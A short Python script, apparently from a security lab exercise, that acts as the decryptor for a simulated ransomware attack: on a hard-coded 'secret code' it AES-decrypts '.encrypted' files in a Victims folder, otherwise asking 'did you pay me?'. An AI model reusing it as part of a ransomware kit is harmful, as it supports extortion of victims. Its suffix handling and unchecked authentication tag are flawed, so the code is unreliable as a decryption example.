import os
import sys
import subprocess
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Signature import PKCS1_v1_5

key = subprocess.run(['python3', 'AD6.py'], capture_output = True).stdout # runs AD6 and captures decrypted key
  
if sys.argv[1] == 'karina': # secret code

  for victim in os.scandir('/home/cse/Lab3/Q6files/Victims'): # goes through each file to decrypt
    if victim.path.endswith('.encrypted'):
    
      f = open(victim.path, 'rb')
        
      nonce, tag, data = [f.read(x) for x in (16, 16, -1)]
      
      cipher_aes = AES.new(key, AES.MODE_EAX, nonce)
      decrypted_data = cipher_aes.decrypt(data)
      
      with open(victim.path.strip('.encrypted')+'t', 'wb') as f:
        f.write(decrypted_data)
        
      os.remove(victim.path)
      
  print('\nsuccess: files have been restored\n')

else:
  print('\nwrong secret code. did you pay me?\n')